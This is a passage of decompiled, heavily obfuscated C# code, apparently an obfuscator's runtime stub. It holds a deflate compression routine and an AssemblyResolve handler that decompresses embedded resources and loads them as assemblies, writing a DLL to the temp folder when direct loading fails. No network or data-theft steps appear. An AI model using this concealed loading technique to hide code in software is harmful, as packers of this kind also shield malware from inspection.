          *(int*) ((IntPtr) voidPtr + 4) = \u0004.\u0003.\u0005.\u0002[obj0.\u0006];
          num3 = \u0008.\u0005.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4));
          if (num3 < 0)
            return false;
          goto label_36;
        default:
          goto label_43;
      }
      return false;
label_12:
      obj0.\u0001 = 3;
      goto label_19;
label_14:
      int num9 = *(int*) voidPtr;
      if (false)
        return num9 != 0;
      if (num9 < 0)
        return false;
      \u0008.\u0005.\u0001(obj1, 3);
      if (true)
      {
        obj0.\u0001[\u0004.\u0003.\u0005.\u0003[obj0.\u0007]] = (byte) *(int*) voidPtr;
        ++obj0.\u0007;
        goto label_19;
      }
      else
        goto label_36;
label_25:
      if (num4 == num5)
        return true;
      goto label_27;
label_36:
      \u0008.\u0005.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4));
      num3 += \u0004.\u0003.\u0005.\u0001[obj0.\u0006];
      while (num3-- > 0)
      {
        byte[] numArray = obj0.\u0002;
        num2 = obj0.\u0007++;
        int index = num2;
        int num10 = (int) obj0.\u0001;
        numArray[index] = (byte) num10;
      }
      if (true)
      {
        if (obj0.\u0007 == obj0.\u0005)
          return true;
        obj0.\u0001 = 4;
      }
      else
        goto label_14;
label_43:
      int num11 = obj0.\u0001;
      if (true)
        num2 = num11;
      num1 = num2;
      goto label_2;
    }

    static int \u0001([In] \u0004.\u0004 obj0) => obj0.\u0004;

    static unsafe Assembly \u0001(object _param0, ResolveEventArgs _param1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(18);
      \u0003.\u0003.\u0001 obj = new \u0003.\u0003.\u0001(_param1.Name);
      string base64String1 = Convert.ToBase64String(Encoding.UTF8.GetBytes(obj.\u0001(false)));
      string[] strArray = "ezkxNmYyYzdkLWI4NDEtNGJhMC1hOWY1LTVlMjQ3NDU2MjdhN30sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{130b132e-727e-4ce9-8ac4-1822f800c13f},ezkxNmYyYzdkLWI4NDEtNGJhMC1hOWY1LTVlMjQ3NDU2MjdhN30=,[z]{130b132e-727e-4ce9-8ac4-1822f800c13f}".Split(',');
      string str1 = string.Empty;
      *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) 0;
      *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 0;
      *(int*) voidPtr = 0;
      while (*(int*) voidPtr < strArray.Length - 1)
      {
        if (strArray[*(int*) voidPtr] == base64String1)
        {
          str1 = strArray[*(int*) voidPtr + 1];
          break;
        }
        *(int*) voidPtr = *(int*) voidPtr + 2;
      }
      if (str1.Length == 0 && obj.\u0003.Length == 0)
      {
        string base64String2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(obj.\u0001));
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        while (*(int*) ((IntPtr) voidPtr + 4) < strArray.Length - 1)
        {
          if (strArray[*(int*) ((IntPtr) voidPtr + 4)] == base64String2)
          {
            str1 = strArray[*(int*) ((IntPtr) voidPtr + 4) + 1];
            break;
          }
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 2;
        }
      }
      if (str1.Length > 0)
      {
        if (str1[0] == '[')
        {
          *(int*) ((IntPtr) voidPtr + 8) = str1.IndexOf(']');
          string str2 = str1.Substring(1, *(int*) ((IntPtr) voidPtr + 8) - 1);
          *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) (str2.IndexOf('z') >= 0);
          *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) (str2.IndexOf('t') >= 0);
          str1 = str1.Substring(*(int*) ((IntPtr) voidPtr + 8) + 1);
        }
        lock (\u0003.\u0003.\u0001)
        {
          if (\u0003.\u0003.\u0001.ContainsKey((object) str1))
            return (Assembly) \u0003.\u0003.\u0001[(object) str1];
          Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(str1);
          if (manifestResourceStream != null)
          {
            *(int*) ((IntPtr) voidPtr + 12) = (int) manifestResourceStream.Length;
            byte[] numArray = new byte[*(int*) ((IntPtr) voidPtr + 12)];
            manifestResourceStream.Read(numArray, 0, *(int*) ((IntPtr) voidPtr + 12));
            if (*(sbyte*) ((IntPtr) voidPtr + 16) != (sbyte) 0)
              numArray = \u0008.\u0005.\u0001(numArray);
            Assembly assembly = (Assembly) null;
            if (*(sbyte*) ((IntPtr) voidPtr + 17) == (sbyte) 0)
            {
              try
              {
                assembly = Assembly.Load(numArray);
              }
              catch (FileLoadException ex)
              {
                *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 1;
              }
              catch (BadImageFormatException ex)
              {
                *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 1;
              }
            }
            if (*(sbyte*) ((IntPtr) voidPtr + 17) != (sbyte) 0)
            {
              try
              {
                string path1 = string.Format("{0}{1}\\", (object) Path.GetTempPath(), (object) str1);
                Directory.CreateDirectory(path1);
                string path2 = path1 + obj.\u0001 + ".dll";
                if (!File.Exists(path2))
                {
                  FileStream fileStream = File.OpenWrite(path2);
                  fileStream.Write(numArray, 0, numArray.Length);
                  fileStream.Close();
                  \u0008.\u0005.\u0001(path2, (string) null, 4);
                  \u0008.\u0005.\u0001(path1, (string) null, 4);
                }
                assembly = Assembly.LoadFile(path2);
              }
              catch
              {
              }
            }
            \u0003.\u0003.\u0001[(object) str1] = (object) assembly;
            return assembly;
          }
        }
      }
      return (Assembly) null;
    }

    static void \u0001([In] int obj0, [In] \u0004.\u0006 obj1)
    {
      byte[] numArray1 = obj1.\u0001;
      \u0004.\u0006 obj2 = obj1;
      int num1;
      int num2 = num1 = obj2.\u0002;
      obj2.\u0002 = num1 + 1;
      int index1 = num2;
      int num3 = (int) (byte) obj0;
      numArray1[index1] = (byte) num3;
      byte[] numArray2 = obj1.\u0001;
      \u0004.\u0006 obj3 = obj1;
      int num4;
      int num5 = num4 = obj3.\u0002;
      obj3.\u0002 = num4 + 1;
      int index2 = num5;
      int num6 = (int) (byte) (obj0 >> 8);
      numArray2[index2] = (byte) num6;
    }

    static unsafe int \u0001([In] \u0002.\u0003 obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      if (obj3 < 0)
        throw new ArgumentOutOfRangeException(\u0008.\u0005.\u0082(415));
      if (obj3 != 0)
        goto label_21;
      else
        goto label_20;
label_18:
      return *(int*) ((IntPtr) voidPtr + 8);
label_20:
      *(int*) ((IntPtr) voidPtr + 8) = 0;
      goto label_18;
label_21:
      *(int*) voidPtr = 0;
      int num1;
      int num2;
      do
      {
        int num3 = obj0.\u0001;
        int num4 = 11;
        while (true)
        {
          if (num3 == num4)
            goto label_11;
          else
            goto label_23;
label_4:
          int num5 = *(int*) ((IntPtr) voidPtr + 4);
          int num6;
          if (false)
          {
            num4 = num5;
            num3 = num6;
            continue;
          }
          obj2 = num6 + num5;
          *(int*) voidPtr = *(int*) voidPtr + *(int*) ((IntPtr) voidPtr + 4);
          if (true)
          {
            obj0.\u0007 += *(int*) ((IntPtr) voidPtr + 4);
            num1 = obj3;
          }
          else
            goto label_10;
label_7:
          num2 = *(int*) ((IntPtr) voidPtr + 4);
          if (true)
          {
            obj3 = num1 - num2;
            num6 = obj3;
            if (true)
            {
              if (num6 == 0)
                goto label_10;
            }
            else
              goto label_4;
          }
          else
            goto label_16;
label_11:
          num1 = \u0008.\u0005.\u0001(obj0) ? 1 : 0;
          if (false)
            goto label_7;
          else
            break;
label_23:
          *(int*) ((IntPtr) voidPtr + 4) = \u0008.\u0005.\u0001(obj1, obj3, obj0.\u0001, obj2);
          obj0.\u0001.\u0001(obj1, obj2, *(int*) ((IntPtr) voidPtr + 4));
          num6 = obj2;
          goto label_4;
        }
        if (num1 == 0)
        {
          if (true)
          {
            if (\u0008.\u0005.\u0001(obj0.\u0001) > 0)
            {
              int num7 = obj0.\u0001;
              num2 = 11;
              num1 = num7;
            }
            else
              break;
          }
          else
            goto label_10;
        }
        else
          continue;
label_16:;
      }
      while (num1 != num2);
      goto label_17;
label_10:
      *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
      goto label_18;
label_17:
      *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
      goto label_18;
    }

    static void \u0001([In] byte[] obj0, [In] int obj1, [In] \u0004.\u0005 obj2, [In] int obj3)
    {
      do
      {
        if (false)
          goto label_17;
        else
          goto label_12;
label_7:
        int num1;
        int num2 = num1;
        int num3;
        int num4;
        if (num4 <= num2)
        {
          if ((obj1 & 1) != 0)
          {
            obj2.\u0001 |= (uint) (((int) obj0[obj3++] & (int) byte.MaxValue) << obj2.\u0003);
            obj2.\u0003 += 8;
          }
          obj2.\u0001 = obj0;
          obj2.\u0001 = obj3;
          obj2.\u0002 = num3;
          continue;
        }
label_8:
        throw new ArgumentOutOfRangeException();
label_12:
        int num5 = obj2.\u0001;
        if (true)
          goto label_13;
label_3:
        if (true)
        {
          num3 = num5;
          int num6 = 0;
          int num7 = obj3;
          if (true)
          {
            if (num6 > num7)
              goto label_8;
            else
              goto label_17;
          }
          else
          {
            num1 = num7;
            num4 = num6;
            goto label_7;
          }
        }
        else
          goto label_15;
label_13:
        int num8 = obj2.\u0002;
        num5 = num5 >= num8 ? obj3 : throw new InvalidOperationException(\u0008.\u0005.\u0082(428));
label_15:
        int num9 = obj1;
        num5 += num9;
        goto label_3;
label_17:
        if (obj3 <= num3)
        {
          num4 = num3;
          num1 = obj0.Length;
          goto label_7;
        }
        else
          goto label_8;
      }
      while (false);
    }

    static \u0008.\u0004 \u0001([In] \u0001.\u0005 obj0)
    {
      if (true)
        goto label_6;
label_5:
      \u0008.\u0004 obj;
      return obj;
label_6:
      int num = obj0.\u0002;
      int length;
      while (true)
      {
        length = (int) checked ((uint) num);
        if (false)
          num = length;
        else
          break;
      }
      byte[] destinationArray = new byte[length];
      if (true)
      {
        if (true)
          Array.Copy((Array) obj0.\u0002, 0, (Array) destinationArray, 0, obj0.\u0002);
        else
          goto label_5;
      }
      obj = new \u0008.\u0004(destinationArray);
      goto label_5;
    }

    static void \u0001([In] \u0004.\u0006 obj0)
    {
      if (obj0.\u0003 > 0)
        goto label_2;
label_1:
      obj0.\u0001 = 0U;
      obj0.\u0003 = 0;
      return;
label_2:
      byte[] numArray1 = obj0.\u0001;
      \u0004.\u0006 obj1 = obj0;
      int num1;
      int num2 = num1 = obj1.\u0002;
      obj1.\u0002 = num1 + 1;
      int index1 = num2;
      int num3 = (int) (byte) obj0.\u0001;
      numArray1[index1] = (byte) num3;
      if (obj0.\u0003 > 8)
      {
        byte[] numArray2 = obj0.\u0001;
        \u0004.\u0006 obj2 = obj0;
        int num4;
        int num5 = num4 = obj2.\u0002;
        obj2.\u0002 = num4 + 1;
        int index2 = num5;
        int num6 = (int) (byte) (obj0.\u0001 >> 8);
        numArray2[index2] = (byte) num6;
        goto label_1;
      }
      else
        goto label_1;
    }

    static Assembly \u0001([In] string obj0)
    {
      if (false)
        goto label_8;
      else
        goto label_21;
label_4:
      string str1;
      return (Assembly) \u000E.\u007E\u0017((object) \u0006.\u0001.\u0001, (object) str1);
label_8:
      string str2;
      byte[] numArray1 = (\u0008.\u0005.\u0001(obj0) ?? \u0008.\u0005.\u0001(global::\u0004.\u007E\u0007((object) obj0))) ?? \u0008.\u0005.\u0001(str2);
      StringDictionary stringDictionary;
      byte[] numArray2;
      if (true)
      {
        if (numArray1 == null)
          numArray1 = \u0008.\u0005.\u0001(global::\u0004.\u007E\u0007((object) str2));
        if (numArray1 == null)
          numArray1 = \u0008.\u0005.\u0001(global::\u0004.\u007E\u0007((object) \u0012.\u001C(str2)));
        if (numArray1 == null)
        {
          try
          {
            if (true)
              numArray1 = \u0008.\u0005.\u0001(stringDictionary);
          }
          catch
          {
            if (true)
              numArray1 = (byte[]) null;
          }
        }
        if (numArray1 == null)
          return (Assembly) null;
        Assembly assembly = \u0008.\u0005.\u0001(numArray1);
        numArray2 = (byte[]) null;
        \u0013.\u007E\u007F((object) \u0006.\u0001.\u0001, (object) str1, (object) assembly);
        return assembly;
      }
      goto label_4;
label_21:
      switch (obj0)
      {
        case null:
          return (Assembly) null;
        default:
          if (\u0006.\u0001.\u0001 == null)
            goto label_22;
label_3:
          obj0 = global::\u0004.\u007E\u000F((object) obj0);
          str1 = global::\u0004.\u007E\u0007((object) obj0);
          if (\u000E.\u007E\u0017((object) \u0006.\u0001.\u0001, (object) str1) == null)
          {
            stringDictionary = \u0008.\u0005.\u0001(obj0);
            str2 = \u001D.\u007E\u008D((object) stringDictionary, \u0006.\u0001.\u0001);
            if (str2 == null)
              return (Assembly) null;
            numArray2 = (byte[]) null;
            goto label_8;
          }
          else
            goto label_4;
label_22:
          \u0006.\u0001.\u0001 = new HybridDictionary();
          goto label_3;
      }
    }

    static void \u0001([In] \u0001.\u0004.\u0001 obj0, [In] int obj1) => \u0008.\u0005.\u0001((\u0004.\u0006) obj0.\u0001.\u0001, (int) obj0.\u0002[obj1] & (int) ushort.MaxValue, (int) obj0.\u0001[obj1]);

    static unsafe void \u0001([In] byte[] obj0, [In] bool obj1, [In] \u0001.\u0004 obj2, [In] int obj3, [In] int obj4)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(24);
      short[] numArray1;
      int index1;
      (numArray1 = obj2.\u0001.\u0001)[index1 = \u0001.\u0004.\u0008] = (short) ((int) numArray1[(IntPtr) index1] + 1);
      \u0008.\u0005.\u0001(obj2.\u0001);
      \u0008.\u0005.\u0001(obj2.\u0002);
      \u0001.\u0004.\u0001 obj5 = obj2.\u0001;
      \u0008.\u0005.\u0001(obj2.\u0003, obj5);
      \u0001.\u0004.\u0001 obj6 = obj2.\u0002;
      \u0008.\u0005.\u0001(obj2.\u0003, obj6);
      \u0008.\u0005.\u0001(obj2.\u0003);
      *(int*) voidPtr = 4;
      *(int*) ((IntPtr) voidPtr + 4) = 18;
      while (*(int*) ((IntPtr) voidPtr + 4) > *(int*) voidPtr)
      {
        if (obj2.\u0003.\u0001[\u0001.\u0004.\u0001[*(int*) ((IntPtr) voidPtr + 4)]] > (byte) 0)
          *(int*) voidPtr = *(int*) ((IntPtr) voidPtr + 4) + 1;
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) - 1;
      }
      *(int*) ((IntPtr) voidPtr + 8) = 14 + *(int*) voidPtr * 3 + \u0008.\u0005.\u0001(obj2.\u0003) + \u0008.\u0005.\u0001(obj2.\u0001) + \u0008.\u0005.\u0001(obj2.\u0002) + obj2.\u000F;
      *(int*) ((IntPtr) voidPtr + 12) = obj2.\u000F;
      *(int*) ((IntPtr) voidPtr + 16) = 0;
      while (*(int*) ((IntPtr) voidPtr + 16) < \u0001.\u0004.\u0002)
      {
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (int) obj2.\u0001.\u0001[*(int*) ((IntPtr) voidPtr + 16)] * (int) \u0001.\u0004.\u0003[*(int*) ((IntPtr) voidPtr + 16)];
        *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
      }
      *(int*) ((IntPtr) voidPtr + 20) = 0;
      while (*(int*) ((IntPtr) voidPtr + 20) < \u0001.\u0004.\u0003)
      {
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (int) obj2.\u0002.\u0001[*(int*) ((IntPtr) voidPtr + 20)] * (int) \u0001.\u0004.\u0004[*(int*) ((IntPtr) voidPtr + 20)];
        *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 20) + 1;
      }
      if (*(int*) ((IntPtr) voidPtr + 8) >= *(int*) ((IntPtr) voidPtr + 12))
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 12);
      int num1 = obj3;
      int num2;
      for (int index2 = 0; num1 >= index2; num1 = num2)
      {
        num2 = obj4;
        int num3 = 4;
        if (num3 == 0)
        {
          index2 = num3;
        }
        else
        {
          if (num2 + num3 < *(int*) ((IntPtr) voidPtr + 8) >> 3)
          {
            \u0008.\u0005.\u0001(obj4, obj0, obj2, obj1, obj3);
            return;
          }
          break;
        }
      }
      if (*(int*) ((IntPtr) voidPtr + 8) == *(int*) ((IntPtr) voidPtr + 12))
      {
        \u0008.\u0005.\u0001((\u0004.\u0006) obj2.\u0001, 2 + (obj1 ? 1 : 0), 3);
        \u0001.\u0004.\u0001 obj7 = obj2.\u0001;
        short[] numArray2 = \u0001.\u0004.\u0002;
        \u0008.\u0005.\u0001(\u0001.\u0004.\u0003, obj7, numArray2);
        \u0001.\u0004.\u0001 obj8 = obj2.\u0002;
        short[] numArray3 = \u0001.\u0004.\u0003;
        \u0008.\u0005.\u0001(\u0001.\u0004.\u0004, obj8, numArray3);
        \u0008.\u0005.\u0001(obj2);
        \u0008.\u0005.\u0001(obj2);
      }
      else
      {
        \u0008.\u0005.\u0001((\u0004.\u0006) obj2.\u0001, 4 + (obj1 ? 1 : 0), 3);
        \u0008.\u0005.\u0001(*(int*) voidPtr, obj2);
        \u0008.\u0005.\u0001(obj2);
        \u0008.\u0005.\u0001(obj2);
      }
    }

    static unsafe void \u0001([In] \u0001.\u0004.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(36);
      void* voidPtr;
      if (true)
        voidPtr = (void*) num1;
      *(int*) voidPtr = obj0.\u0001.Length;
      int[] numArray1 = new int[(int) checked ((uint) *(int*) voidPtr)];
      int num2 = 0;
      int num3;
      if (true)
        num3 = 0;
      *(int*) ((IntPtr) voidPtr + 4) = 0;
      int[] numArray2;
      int num4;
      while (true)
      {
        int num5 = *(int*) ((IntPtr) voidPtr + 4);
label_7:
        int num6 = *(int*) voidPtr;
        if (num5 >= num6)
        {
          int num7;
          for (; num2 < 2; numArray1[num2++] = num7)
          {
            int num8;
            if (num3 >= 2)
              num8 = 0;
            else
              num3 = num8 = num3 + 1;
            num7 = num8;
          }
          obj0.\u0002 = Math.Max(num3 + 1, obj0.\u0001);
          int[] numArray3;
          int num9;
          int num10;
          if (true)
          {
            *(int*) ((IntPtr) voidPtr + 12) = num2;
            int length = 4 * num2 - 2;
            if (true)
            {
              numArray2 = new int[(int) checked ((uint) length)];
              numArray3 = new int[(int) checked ((uint) unchecked (2 * num2 - 1))];
              num9 = *(int*) ((IntPtr) voidPtr + 12);
              *(int*) ((IntPtr) voidPtr + 16) = 0;
              while (*(int*) ((IntPtr) voidPtr + 16) < num2)
              {
                *(int*) ((IntPtr) voidPtr + 20) = numArray1[*(int*) ((IntPtr) voidPtr + 16)];
                numArray2[2 * *(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 20);
                numArray2[2 * *(int*) ((IntPtr) voidPtr + 16) + 1] = -1;
                numArray3[*(int*) ((IntPtr) voidPtr + 16)] = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 20)] << 8;
                numArray1[*(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 16);
                *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
              }
            }
            else
            {
              num10 = length;
              goto label_32;
            }
          }
          else
            goto label_35;
label_18:
          *(int*) ((IntPtr) voidPtr + 24) = numArray1[0];
          int index1 = numArray1[--num2];
          int index2 = 0;
          for (int index3 = 1; index3 < num2; index3 = index3 * 2 + 1)
          {
            if (index3 + 1 < num2 && numArray3[numArray1[index3]] > numArray3[numArray1[index3 + 1]])
            {
              int num11 = index3;
              if (false)
              {
                num5 = num11;
                goto label_7;
              }
              else
                index3 = num11 + 1;
            }
            numArray1[index2] = numArray1[index3];
            index2 = index3;
          }
          int num12 = numArray3[index1];
          int index4;
          while ((index4 = index2) > 0 && numArray3[numArray1[index2 = (index4 - 1) / 2]] > num12)
            numArray1[index4] = numArray1[index2];
          numArray1[index4] = index1;
          *(int*) ((IntPtr) voidPtr + 28) = numArray1[0];
          index1 = num9++;
          numArray2[2 * index1] = *(int*) ((IntPtr) voidPtr + 24);
          numArray2[2 * index1 + 1] = *(int*) ((IntPtr) voidPtr + 28);
          *(int*) ((IntPtr) voidPtr + 32) = Math.Min(numArray3[*(int*) ((IntPtr) voidPtr + 24)] & (int) byte.MaxValue, numArray3[*(int*) ((IntPtr) voidPtr + 28)] & (int) byte.MaxValue);
          int num13;
          numArray3[index1] = num13 = numArray3[*(int*) ((IntPtr) voidPtr + 24)] + numArray3[*(int*) ((IntPtr) voidPtr + 28)] - *(int*) ((IntPtr) voidPtr + 32) + 1;
          index2 = 0;
          int index5 = 1;
          goto label_33;
label_29:
          int num14 = num2;
          int num15;
          if (num15 < num14 && numArray3[numArray1[index5]] > numArray3[numArray1[index5 + 1]])
            ++index5;
          numArray1[index2] = numArray1[index5];
          num10 = index5;
label_32:
          index2 = num10;
          index5 = index2 * 2 + 1;
label_33:
          if (index5 < num2)
          {
            num15 = index5 + 1;
            goto label_29;
          }
label_35:
          while ((index5 = index2) > 0 && numArray3[numArray1[index2 = (index5 - 1) / 2]] > num13)
            numArray1[index5] = numArray1[index2];
          numArray1[index5] = index1;
          if (num2 <= 1)
          {
            num4 = numArray1[0];
            if (false)
            {
              num15 = num4;
              goto label_29;
            }
            else
              break;
          }
          else
            goto label_18;
        }
        else
        {
          *(int*) ((IntPtr) voidPtr + 8) = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
          if (*(int*) ((IntPtr) voidPtr + 8) != 0)
          {
            int index6;
            int index7;
            for (index6 = num2++; index6 > 0 && (int) obj0.\u0001[numArray1[index7 = (index6 - 1) / 2]] > *(int*) ((IntPtr) voidPtr + 8); index6 = index7)
              numArray1[index6] = numArray1[index7];
            numArray1[index6] = *(int*) ((IntPtr) voidPtr + 4);
            num3 = *(int*) ((IntPtr) voidPtr + 4);
          }
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
        }
      }
      int num16 = numArray2.Length / 2 - 1;
      if (num4 != num16)
        throw new Exception(\u0008.\u0005.\u0082(481));
      \u0008.\u0005.\u0001(obj0, numArray2);
    }

    static void \u0001([In] int obj0, [In] \u0001.\u0004 obj1)
    {
      \u0001.\u0004.\u0001 obj = obj1.\u0003;
      if (true)
        \u0008.\u0005.\u0001(obj);
      \u0008.\u0005.\u0001(obj1.\u0001);
      \u0008.\u0005.\u0001(obj1.\u0002);
      \u0008.\u0005.\u0001((\u0004.\u0006) obj1.\u0001, obj1.\u0001.\u0002 - 257, 5);
      \u0008.\u0005.\u0001((\u0004.\u0006) obj1.\u0001, obj1.\u0002.\u0002 - 1, 5);
      \u0008.\u0005.\u0001((\u0004.\u0006) obj1.\u0001, obj0 - 4, 4);
      for (int index = 0; index < obj0; ++index)
        \u0008.\u0005.\u0001((\u0004.\u0006) obj1.\u0001, (int) obj1.\u0003.\u0001[\u0001.\u0004.\u0001[index]], 3);
      \u0008.\u0005.\u0001(obj1.\u0001, obj1.\u0003);
      \u0008.\u0005.\u0001(obj1.\u0002, obj1.\u0003);
    }

    static uint \u0001([In] byte obj0, [In] \u0002.\u0002 obj1, [In] uint obj2)
    {
      int num1;
      if (true)
      {
        int num2 = (int) \u0003.\u0008.\u0001[(IntPtr) (uint) (((int) obj2 ^ (int) obj0) & (int) byte.MaxValue)];
        if (true)
        {
          if (true)
          {
            int num3 = (int) (obj2 >> 8);
            num1 = num2 ^ num3;
            goto label_8;
          }
          else
          {
            num1 = num2;
            goto label_8;
          }
        }
        else
          num1 = num2;
      }
      else
        goto label_9;
label_6:
      if (true)
        return (uint) num1;
label_8:
      uint num4 = (uint) num1;
label_9:
      num1 = (int) num4;
      goto label_6;
    }

    static void \u0001()
    {
      try
      {
        AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u0008.\u0005.\u0001);
      }
      catch
      {
      }
    }

    static unsafe int \u0001([In] \u0004.\u0003.\u0002 obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      *(int*) voidPtr = 0;
      int num1;
      int num2;
      int num3;
      while (true)
      {
        int num4 = obj0.\u0003;
        int num5 = 0;
        while (true)
        {
          if (num5 == 0)
          {
            if (num4 <= num5 || obj3 <= 0)
            {
              if (obj3 != 0)
              {
                *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0002 - obj0.\u0001;
                int num6 = obj3;
                num5 = *(int*) ((IntPtr) voidPtr + 4);
                num4 = num6;
              }
              else
                break;
            }
            else
              goto label_21;
          }
          if (num4 > num5)
            obj3 = *(int*) ((IntPtr) voidPtr + 4);
          do
          {
            Array.Copy((Array) obj0.\u0001, obj0.\u0001, (Array) obj1, obj2, obj3);
          }
          while (false);
          obj0.\u0001 += obj3;
          num1 = obj0.\u0001;
          if (true)
          {
            int num7 = obj0.\u0002;
            num2 = num1 - num7;
            num3 = 1;
            if (num3 == 0)
            {
              num5 = num3;
              num4 = num2;
            }
            else
              goto label_15;
          }
          else
            goto label_20;
        }
        if (false)
          goto label_22;
        else
          break;
label_21:
        obj1[obj2++] = (byte) obj0.\u0001;
        if (true)
        {
          obj0.\u0001 >>= 8;
          obj0.\u0003 -= 8;
          --obj3;
        }
        else
          goto label_16;
label_22:
        *(int*) voidPtr = *(int*) voidPtr + 1;
      }
      return *(int*) voidPtr;
label_15:
      if ((num2 & num3) == 0)
        goto label_19;
label_16:
      if (true)
        obj0.\u0001 = (uint) obj0.\u0001[obj0.\u0001++] & (uint) byte.MaxValue;
      obj0.\u0003 = 8;
label_19:
      num1 = *(int*) voidPtr;
label_20:
      int num8 = obj3;
      return num1 + num8;
    }

    static MemoryStream \u0001([In] byte[] obj0)
    {
label_0:
      while (obj0 != null)
      {
        if (true)
          goto label_22;
label_3:
        MemoryStream memoryStream1;
        MemoryStream memoryStream2;
        do
        {
          memoryStream2 = (MemoryStream) null;
          if (true)
          {
            if (true)
              goto label_23;
label_5:
            \u0002.\u0002 obj;
            try
            {
              MemoryStream memoryStream3 = new MemoryStream(obj0);
              if (true)
                memoryStream1 = memoryStream3;
              memoryStream2 = new MemoryStream();
              obj = new \u0002.\u0002((Stream) memoryStream1);
              byte[] numArray;
              int num1;
              if (true)
              {
                int length = obj0.Length;
                if (true)
                {
                  numArray = new byte[length];
                }
                else
                {
                  num1 = length;
                  goto label_9;
                }
              }
              else
                goto label_10;
label_8:
              num1 = \u001A.\u007E\u0088((object) obj, numArray, 0, numArray.Length);
label_9:
              int num2 = num1;
              if (num2 <= 0)
              {
                \u001B.\u007E\u008B((object) memoryStream2);
                long num3 = \u008E.\u007E\u0004\u0002((object) memoryStream2, 0L, SeekOrigin.Begin);
                goto label_20;
              }
label_10:
              \u008D.\u007E\u0003\u0002((object) memoryStream2, numArray, 0, num2);
              goto label_8;
            }
            finally
            {
              do
              {
                if (memoryStream1 != null)
                  \u001B.\u007E\u0089((object) memoryStream1);
                if (obj == null)
                  goto label_19;
              }
              while (false);
              \u001B.\u007E\u0089((object) obj);
label_19:
              memoryStream1 = (MemoryStream) null;
              obj = (\u0002.\u0002) null;
            }
label_20:
            continue;
label_23:
            obj = (\u0002.\u0002) null;
            goto label_5;
          }
          else
            goto label_0;
        }
        while (false);
        return memoryStream2;
label_22:
        memoryStream1 = (MemoryStream) null;
        goto label_3;
      }
      return (MemoryStream) null;
    }

    static int \u0001([In] \u0004.\u0003.\u0007 obj0) => obj0.ReadByte() | obj0.ReadByte() << 8;

    static short \u0001([In] int obj0)
    {
      short num1;
      do
      {
        int num2 = (int) \u0001.\u0004.\u0001[obj0 & 15];
        if (true)
        {
          int num3 = 12;
          int num4;
          int num5;
          while (true)
          {
            num4 = num2 << num3;
            int num6 = (int) \u0001.\u0004.\u0001[obj0 >> 4 & 15];
            int num7 = 8;
            if (num7 != 0)
            {
              int num8 = num6 << num7;
              int num9 = num4 | num8;
              int num10 = (int) \u0001.\u0004.\u0001[obj0 >> 8 & 15];
              num7 = 4;
              num6 = num10;
              num4 = num9;
            }
            num5 = num6 << num7;
            if (false)
            {
              num3 = num5;
              num2 = num4;
            }
            else
              break;
          }
          num2 = (int) (short) (num4 | num5 | (int) \u0001.\u0004.\u0001[obj0 >> 12]);
        }
        num1 = (short) num2;
        if (false)
          ;
      }
      while (false);
      return num1;
    }

    static unsafe bool \u0001([In] \u0002.\u0003 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(5);
      int num;
      while (true)
      {
        num = obj0.\u0003;
        if (true)
        {
          if (num > 0)
            goto label_9;
          else
            goto label_6;
label_1:
          if (false)
            goto label_9;
          else
            goto label_10;
label_6:
          if (false)
            goto label_1;
          else
            goto label_7;
label_9:
          *(int*) voidPtr = \u0008.\u0005.\u0001(obj0.\u0001, 8);
          if (*(int*) voidPtr >= 0)
          {
            do
            {
              \u0008.\u0005.\u0001(obj0.\u0001, 8);
              if (true)
                obj0.\u0002 = obj0.\u0002 << 8 | *(int*) voidPtr;
              else
                goto label_8;
            }
            while (false);
            obj0.\u0003 -= 8;
          }
          else
            goto label_1;
        }
        else
          break;
      }
      return num != 0;
label_7:
      *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
label_8:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 4);
label_10:
      *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
      if (false)
        goto label_8;
      else
        goto label_8;
    }

